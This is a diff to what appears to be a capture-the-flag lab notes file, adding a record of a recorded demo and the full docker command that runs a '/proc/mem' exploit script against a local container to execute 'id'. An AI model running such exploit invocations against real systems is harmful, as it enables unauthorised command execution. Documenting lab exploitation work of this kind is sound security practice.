@@ -90,6 +90,20 @@ asciinema record --overwrite --return --idle-time-limit 1 --window-size 120x36 \
   artifacts/coreless_proc_mem_win_20260518.cast
 ```
 
+- Recorded a second full-execution demo that starts with the visible exploit command against the Docker container IP from a throwaway attacker container on the same Docker network:
+  - target: `172.21.0.2:19321`,
+  - cast: `artifacts/coreless_proc_mem_docker_ip_full_20260518.cast`,
+  - gif: `artifacts/coreless_proc_mem_docker_ip_full_20260518.gif`.
+- Equivalent command:
+
+```bash
+docker run --rm --platform linux/amd64 --network env_default --entrypoint python3 \
+  -v "$PWD:/work" -w /work \
+  nginx-rift-ctf-lfi tools/proc_mem_coreless_exploit.py \
+  --target 172.21.0.2:19321 --cmd id --target-len 6 \
+  --max-region 268435456 --max-final-candidates 5
+```
+
 ### Known-Offset Brute Force Check
 
 - Tested the older no-core, no-proc-mem known-offset candidate path with full 6-byte overwrite:
